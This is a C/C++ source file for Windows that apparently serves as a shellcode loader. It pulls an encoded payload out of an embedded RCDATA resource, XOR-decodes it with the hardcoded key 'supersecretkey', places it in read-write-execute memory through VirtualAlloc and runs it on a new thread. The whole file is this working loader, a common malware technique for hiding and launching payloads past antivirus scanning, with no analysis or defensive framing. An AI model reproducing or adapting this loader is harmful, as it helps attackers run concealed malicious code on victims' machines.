#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <winuser.h> 

#ifndef SHELLCODE_LEN
#error "SHELLCODE_LEN is not defined. Please define it during compilation"
#endif

#ifndef RESOURCE_NAME
#error "RESOURCE_NAME is not defined. Please define it during compilation."
#endif

void extractAndExecShellcode(HMODULE hModule){
    LPCWSTR resourceName = RESOURCE_NAME;
    LPCWSTR resourceType = reinterpret_cast<LPCWSTR>(RT_RCDATA);

    // Find resource in executable
    HRSRC hRes = FindResourceW(hModule, resourceName, resourceType);
    if(!hRes){
        printf("Failed to find resource. Error: %u\n", GetLastError());
        return;
    }

    // Load into memory
    HGLOBAL hLoadedResource = LoadResource(hModule, hRes);
    if(!hLoadedResource){
        printf("Failed to load resource. Error: %u\n", GetLastError());
        return;
    }

    // Get pointer to resource
    LPVOID pResData = LockResource(hLoadedResource);
    if(!pResData){
        printf("Failed to lock resource. Error: %u\n", GetLastError());
        return;
    }

    // Get size of resource
    DWORD resSize = SizeofResource(hModule, hRes);
    if(resSize == 0){
        printf("Failed to get size. Error: %u\n", GetLastError());
        return;
    }

    LPBYTE enc_shellcode = (LPBYTE)pResData + (resSize - SHELLCODE_LEN);

    LPCSTR key = "supersecretkey";
    BYTE shellcode[SHELLCODE_LEN];

    for(SIZE_T i = 0; i < SHELLCODE_LEN; i++){
        shellcode[i]  = enc_shellcode[i] ^ key[i % strlen(key)];
    }

    LPVOID virtualMemory = VirtualAlloc(NULL, SHELLCODE_LEN, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(!virtualMemory){
        printf("Failed to allocate memory. Error: %u\n", GetLastError());
        return;
    }

    RtlCopyMemory(virtualMemory, shellcode, SHELLCODE_LEN);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)virtualMemory, NULL, 0, NULL);
    if(hThread == NULL){
        printf("Failed to start thread. Error: %u\n", GetLastError());
        return;
    }

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);

    VirtualFree(virtualMemory, 0, MEM_RELEASE);
}

int main(int argc, char **argv){
    HMODULE hModule = GetModuleHandle(NULL);
    if(!hModule){
        printf("Failed to get module handle. Error: %u\n", GetLastError());
        return -1;
    }

    extractAndExecShellcode(hModule);

    return 0;
}